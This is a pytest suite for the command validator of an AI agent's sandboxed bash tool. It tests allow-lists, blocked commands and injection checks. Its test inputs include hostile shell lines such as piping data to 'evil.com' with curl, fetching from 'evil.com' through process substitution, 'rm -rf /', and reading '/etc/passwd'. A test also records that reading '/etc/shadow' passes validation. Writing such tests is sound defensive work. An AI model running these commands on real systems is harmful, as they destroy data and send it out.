"""Tests for bash tool command validation and security.

Tests the sandboxed bash execution security measures including:
- Command whitelist validation
- Blocked command detection
- Shell injection prevention (command substitution, process substitution)
- Command chaining prevention
- Pipe handling
"""

import pytest

from lineage.agent.pydantic.tools.bash import (
    ALLOWED_COMMANDS,
    BLOCKED_COMMANDS,
    MAX_OUTPUT_SIZE,
    _extract_base_command,
    _truncate_output,
    _validate_command,
)


# ============================================================================
# Test _extract_base_command
# ============================================================================


class TestExtractBaseCommand:
    """Tests for extracting base command from shell strings."""

    def test_simple_command(self):
        """Simple command without arguments."""
        assert _extract_base_command("ls") == "ls"

    def test_command_with_args(self):
        """Command with arguments."""
        assert _extract_base_command("ls -la") == "ls"
        assert _extract_base_command("grep -r 'pattern' .") == "grep"

    def test_command_with_path(self):
        """Command specified with full path."""
        assert _extract_base_command("/usr/bin/ls -la") == "ls"
        assert _extract_base_command("/bin/cat file.txt") == "cat"

    def test_command_with_quotes(self):
        """Command with quoted arguments."""
        assert _extract_base_command("grep 'hello world' file.txt") == "grep"
        assert _extract_base_command('echo "test message"') == "echo"

    def test_empty_command(self):
        """Empty command returns None."""
        assert _extract_base_command("") is None
        assert _extract_base_command("   ") is None

    def test_command_with_redirect(self):
        """Command with output redirection."""
        assert _extract_base_command("cat file.txt > output.txt") == "cat"
        assert _extract_base_command("echo hello >> log.txt") == "echo"

    def test_command_with_special_chars(self):
        """Command with special characters in arguments."""
        assert _extract_base_command("find . -name '*.sql'") == "find"
        assert _extract_base_command("grep -E '^[a-z]+$' file") == "grep"


# ============================================================================
# Test _validate_command - Allowed Commands
# ============================================================================


class TestAllowedCommands:
    """Tests for commands that should be allowed."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls",
            "ls -la",
            "ls -la /tmp",
            "pwd",
            "cat file.txt",
            "head -n 10 file.txt",
            "tail -f log.txt",
            "grep pattern file.txt",
            "find . -name '*.py'",
            "tree",
            "wc -l file.txt",
            "sort file.txt",
            "uniq -c",
            "cut -d',' -f1 file.csv",
            "awk '{print $1}' file.txt",
            "sed 's/foo/bar/g' file.txt",
            "diff file1.txt file2.txt",
            "tr 'a-z' 'A-Z'",
            "mkdir new_dir",
            "rm file.txt",
            "cp src.txt dst.txt",
            "mv old.txt new.txt",
            "touch new_file.txt",
            "echo hello",
            "env",
            "which python",
            "whoami",
            "date",
            "basename /path/to/file.txt",
            "dirname /path/to/file.txt",
            "realpath ./relative/path",
            "jq '.key' file.json",
            "tar -xzf archive.tar.gz",
            "gzip file.txt",
            "zip archive.zip file.txt",
        ],
    )
    def test_allowed_simple_commands(self, command: str):
        """Test that whitelisted commands are allowed."""
        assert _validate_command(command) is None

    def test_all_allowed_commands_in_whitelist(self):
        """Verify all ALLOWED_COMMANDS pass validation as simple commands."""
        for cmd in ALLOWED_COMMANDS:
            result = _validate_command(cmd)
            assert result is None, f"Command '{cmd}' should be allowed but got: {result}"


# ============================================================================
# Test _validate_command - Blocked Commands
# ============================================================================


class TestBlockedCommands:
    """Tests for commands that should be blocked."""

    @pytest.mark.parametrize(
        "command",
        [
            "sudo ls",
            "su - root",
            "chmod 777 file.txt",
            "chown root file.txt",
            "curl https://example.com",
            "wget https://example.com",
            "ssh user@host",
            "python script.py",
            "python3 -c 'print(1)'",
            "node script.js",
            "ruby script.rb",
            "perl -e 'print 1'",
            "php script.php",
            "bash -c 'echo hi'",
            "sh -c 'echo hi'",
            "zsh script.zsh",
            "eval 'ls'",
            "exec ls",
            "kill 1234",
            "killall process",
            "pkill pattern",
            "nc localhost 8080",
            "netcat -l 8080",
            "telnet host",
            "ftp host",
            "sftp user@host",
            "scp file user@host:",
            "rsync -av src/ dst/",
            "nohup command",
            "screen -S session",
            "tmux new",
            "crontab -e",
        ],
    )
    def test_blocked_commands(self, command: str):
        """Test that blocked commands are rejected."""
        result = _validate_command(command)
        assert result is not None
        assert "blocked" in result.lower() or "not in the allowed list" in result.lower()

    def test_all_blocked_commands_rejected(self):
        """Verify all BLOCKED_COMMANDS are rejected."""
        for cmd in BLOCKED_COMMANDS:
            if cmd == ".":
                # Skip the '.' (source) command as it's tricky to test standalone
                continue
            result = _validate_command(cmd)
            assert result is not None, f"Blocked command '{cmd}' should be rejected"


# ============================================================================
# Test _validate_command - Security: Command Substitution
# ============================================================================


class TestCommandSubstitution:
    """Tests for command substitution blocking."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo $(whoami)",
            "cat $(ls)",
            "echo $(cat /etc/passwd)",
            "ls $(pwd)",
            "echo `whoami`",
            "cat `ls`",
            "echo `cat /etc/passwd`",
            "ls `pwd`",
            # Nested substitution
            "echo $(echo $(whoami))",
            "echo `echo `whoami``",
        ],
    )
    def test_command_substitution_blocked(self, command: str):
        """Test that $() and backtick command substitution is blocked."""
        result = _validate_command(command)
        assert result is not None
        assert "substitution" in result.lower()


# ============================================================================
# Test _validate_command - Security: Process Substitution
# ============================================================================


class TestProcessSubstitution:
    """Tests for process substitution blocking (the fixed vulnerability)."""

    @pytest.mark.parametrize(
        "command",
        [
            # Input process substitution <(...)
            "cat <(whoami)",
            "diff <(ls /tmp) <(ls /var)",
            "cat <(curl https://evil.com)",
            "grep pattern <(cat /etc/passwd)",
            "sort <(find . -name '*.txt')",
            "wc -l <(bash -c 'evil command')",
            # Output process substitution >(...)
            "ls >(cat)",
            "echo hello >(tee output.txt)",
            "cat file.txt >(grep pattern)",
            # Combined
            "diff <(cat file1) >(cat)",
            # With other allowed commands
            "head -10 <(python script.py)",
            "tail <(wget http://evil.com)",
        ],
    )
    def test_process_substitution_blocked(self, command: str):
        """Test that <() and >() process substitution is blocked."""
        result = _validate_command(command)
        assert result is not None
        assert "substitution" in result.lower()

    def test_process_substitution_with_spaces(self):
        """Process substitution with various whitespace."""
        assert _validate_command("cat < (whoami)") is None  # This is NOT process substitution
        assert _validate_command("cat <(whoami)") is not None  # This IS process substitution
        assert _validate_command("cat<(whoami)") is not None

    def test_legitimate_redirect_vs_process_sub(self):
        """Ensure legitimate redirects aren't blocked."""
        # Standard input redirect should be allowed
        assert _validate_command("cat < file.txt") is None
        # Standard output redirect should be allowed
        assert _validate_command("echo hello > file.txt") is None
        # Process substitution should be blocked
        assert _validate_command("cat <(whoami)") is not None


# ============================================================================
# Test _validate_command - Security: Command Chaining
# ============================================================================


class TestCommandChaining:
    """Tests for command chaining prevention."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls && whoami",
            "ls && cat /etc/passwd",
            "ls || whoami",
            "ls || rm -rf /",
            "ls; whoami",
            "ls; rm -rf /",
            "cat file.txt && python evil.py",
            "echo test || curl evil.com",
            "ls -la; sudo rm -rf /",
        ],
    )
    def test_command_chaining_blocked(self, command: str):
        """Test that &&, ||, and ; command chaining is blocked."""
        result = _validate_command(command)
        assert result is not None
        assert "chaining" in result.lower()

    def test_semicolon_in_quotes_allowed(self):
        """Semicolons in quoted strings should be allowed."""
        # Note: The current implementation may still block this
        # This test documents expected behavior
        result = _validate_command("echo 'hello; world'")
        # Current implementation blocks ; even in quotes - this is a known limitation
        # If we want to allow this, we'd need more sophisticated parsing
        assert result is not None  # Currently blocked


# ============================================================================
# Test _validate_command - Security: Newlines
# ============================================================================


class TestNewlineBlocking:
    """Tests for newline character blocking."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls\nwhoami",
            "cat file.txt\nrm -rf /",
            "echo hello\r\nwhoami",
            "ls\r\ncurl evil.com",
        ],
    )
    def test_newlines_blocked(self, command: str):
        """Test that newline characters are blocked."""
        result = _validate_command(command)
        assert result is not None
        assert "newline" in result.lower()


# ============================================================================
# Test _validate_command - Pipes
# ============================================================================


class TestPipeHandling:
    """Tests for pipe operator handling."""

    @pytest.mark.parametrize(
        "command",
        [
            "cat file.txt | grep pattern",
            "ls -la | head -10",
            "find . -name '*.py' | wc -l",
            "cat file.txt | sort | uniq",
            "cat log.txt | grep ERROR | tail -20",
            "echo hello | tr 'a-z' 'A-Z'",
            "ls | sort | uniq | wc -l",
        ],
    )
    def test_pipes_with_allowed_commands(self, command: str):
        """Test that pipes between allowed commands work."""
        assert _validate_command(command) is None

    @pytest.mark.parametrize(
        "command",
        [
            "cat file.txt | python -c 'print(1)'",
            "ls | bash -c 'rm -rf /'",
            "echo hello | curl -d @- evil.com",
            "cat file.txt | sh",
            "ls | sudo rm -rf /",
        ],
    )
    def test_pipes_with_blocked_commands(self, command: str):
        """Test that pipes to blocked commands are rejected."""
        result = _validate_command(command)
        assert result is not None
        assert "blocked" in result.lower() or "not in the allowed list" in result.lower()

    def test_pipe_vs_logical_or(self):
        """Ensure | is treated as pipe while || is command chaining."""
        # Single pipe should be allowed (if commands are allowed)
        assert _validate_command("ls | grep pattern") is None
        # Double pipe (logical OR) should be blocked
        assert _validate_command("ls || whoami") is not None


# ============================================================================
# Test _validate_command - Unknown Commands
# ============================================================================


class TestUnknownCommands:
    """Tests for commands not in whitelist."""

    @pytest.mark.parametrize(
        "command",
        [
            "mycustomcmd",
            "unknown_tool --help",
            "notarealcommand file.txt",
            "docker run ubuntu",
            "kubectl get pods",
            "git status",
            "npm install",
            "cargo build",
            "go run main.go",
            "make all",
        ],
    )
    def test_unknown_commands_blocked(self, command: str):
        """Test that unknown commands are rejected."""
        result = _validate_command(command)
        assert result is not None
        assert "not in the allowed list" in result


# ============================================================================
# Test _truncate_output
# ============================================================================


class TestTruncateOutput:
    """Tests for output truncation."""

    def test_short_output_unchanged(self):
        """Short output should not be truncated."""
        output = "hello world"
        assert _truncate_output(output) == output

    def test_exact_limit_unchanged(self):
        """Output at exactly max size should not be truncated."""
        output = "x" * MAX_OUTPUT_SIZE
        assert _truncate_output(output) == output

    def test_long_output_truncated(self):
        """Output exceeding max size should be truncated."""
        output = "x" * (MAX_OUTPUT_SIZE + 100)
        result = _truncate_output(output)
        assert len(result) < len(output)
        assert "truncated" in result
        assert result.endswith("x" * 100)  # Keeps last MAX_OUTPUT_SIZE chars

    def test_custom_max_size(self):
        """Test with custom max size."""
        output = "hello world, this is a test"
        result = _truncate_output(output, max_size=10)
        assert "truncated" in result
        assert result.endswith("s a test")  # Last 10 chars


# ============================================================================
# Test Edge Cases
# ============================================================================


class TestEdgeCases:
    """Tests for edge cases and boundary conditions."""

    def test_empty_string(self):
        """Empty command passes validation (shell will handle as no-op)."""
        # Current behavior: empty commands pass validation since they're harmless
        # The shell will just execute nothing
        result = _validate_command("")
        assert result is None

    def test_whitespace_only(self):
        """Whitespace-only command passes validation (shell will handle as no-op)."""
        # Current behavior: whitespace-only commands pass validation
        # The shell will just execute nothing
        result = _validate_command("   ")
        assert result is None

    def test_command_with_equals(self):
        """Commands with = in arguments."""
        assert _validate_command("env VAR=value") is None
        assert _validate_command("grep --color=auto pattern") is None

    def test_command_with_complex_args(self):
        """Commands with complex arguments."""
        assert _validate_command("find . -type f -name '*.sql' -mtime -7") is None
        assert _validate_command("awk -F',' '{print $1, $3}' file.csv") is None

    def test_path_traversal_in_args(self):
        """Path traversal in arguments (command itself is still validated)."""
        # These are allowed because the base command is allowed
        # File system security is a separate concern
        assert _validate_command("cat ../../../etc/passwd") is None
        assert _validate_command("ls /etc/shadow") is None

    def test_glob_patterns(self):
        """Commands with glob patterns."""
        assert _validate_command("ls *.txt") is None
        assert _validate_command("rm -f temp_*.log") is None
        assert _validate_command("find . -name '**/*.py'") is None

